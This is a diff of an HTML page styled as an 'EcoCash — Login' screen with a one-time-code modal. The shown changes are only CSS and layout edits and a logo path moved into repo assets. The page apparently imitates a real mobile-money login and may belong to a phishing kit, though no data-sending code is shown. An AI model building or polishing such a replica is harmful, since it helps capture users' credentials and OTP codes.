@@ -6,25 +6,27 @@
 <title>EcoCash — Login</title>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
 <style>
-  body{font-family:Inter,system-ui,Arial;background:linear-gradient(180deg,#f7fbff,#e8f3ff);margin:0;display:flex;align-items:center;justify-content:center;height:100vh}
-  .card{width:360px;background:#fff;padding:22px;border-radius:12px;box-shadow:0 12px 30px rgba(2,6,23,0.06)}
-  .logo{height:40px;display:block;margin:0 auto 10px}
-  h2{text-align:center;margin:0 0 12px;color:#111}
+  *{box-sizing:border-box}
+  body{font-family:Inter,system-ui,Arial;background:linear-gradient(180deg,#f7fbff,#e8f3ff);margin:0;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:18px}
+  .card{width:100%;max-width:380px;background:#fff;padding:20px;border-radius:12px;box-shadow:0 12px 30px rgba(2,6,23,0.06)}
+  .logo{height:44px;display:block;margin:0 auto 10px}
+  h2{text-align:center;margin:0 0 12px;color:#111;font-size:20px}
   label{display:block;font-size:13px;color:#374151;margin-top:8px}
-  input,select{width:100%;padding:10px;border-radius:8px;border:1px solid #e6eefc;background:#fbfdff}
+  input,select{width:100%;padding:10px;border-radius:8px;border:1px solid #e6eefc;background:#fbfdff;font-size:14px}
   .btn{background:#4b86ff;color:#fff;padding:10px;border-radius:8px;border:0;margin-top:12px;cursor:pointer;width:100%}
   .muted{font-size:13px;color:#6b7280;text-align:center;margin-top:12px}
   .otp-modal{position:fixed;left:0;top:0;width:100%;height:100%;display:flex;align-items:center;justify-content:center;background:rgba(0,0,0,0.35)}
-  .otp-box{background:#fff;padding:18px;border-radius:12px;min-width:280px}
+  .otp-box{background:#fff;padding:18px;border-radius:12px;min-width:260px;max-width:92%;box-shadow:0 12px 24px rgba(2,6,23,0.08)}
   .req{color:#d04444;margin-right:6px}
-  .small{font-size:12px;color:#6b7280}
+  .small{font-size:13px;color:#6b7280}
   .success{color:#16a34a;font-weight:600}
+  @media(max-width:420px){ .card{padding:16px} h2{font-size:18px} .logo{height:40px} }
 </style>
 </head>
 <body>
   <div class="card">
-    <!-- logo using uploaded file path -->
-    <img src="sandbox:/mnt/data/eco.png" alt="EcoCash logo" class="logo" onerror="this.style.display='none'">
+    <!-- logo served from your repo assets folder -->
+    <img src="assets/eco.png" alt="EcoCash logo" class="logo">
 
     <h2>Log In</h2>
     <form id="loginForm">
@@ -46,7 +48,7 @@
     <div class="otp-box">
       <div style="text-align:center"><strong>Enter OTP</strong></div>
       <p class="small" style="margin:8px 0 14px">We have sent an OTP to your phone. Enter it here to confirm.</p>
-      <input id="otpInput" placeholder="Enter OTP code" style="width:100%;padding:10px;border-radius:8px;border:1px solid #e6eefc" />
+      <input id="otpInput" placeholder="Enter OTP code" style="width:100%;padding:10px;border-radius:8px;border:1px solid #e6eefc;font-size:14px" />
       <div style="display:flex;gap:10px;margin-top:12px">
         <button id="confirmOtp" style="flex:1;padding:8px;border-radius:8px;border:0;background:#16a34a;color:white;cursor:pointer">Confirm</button>
         <button id="cancelOtp" style="flex:1;padding:8px;border-radius:8px;border:0;background:#e5e7eb;cursor:pointer">Cancel</button>
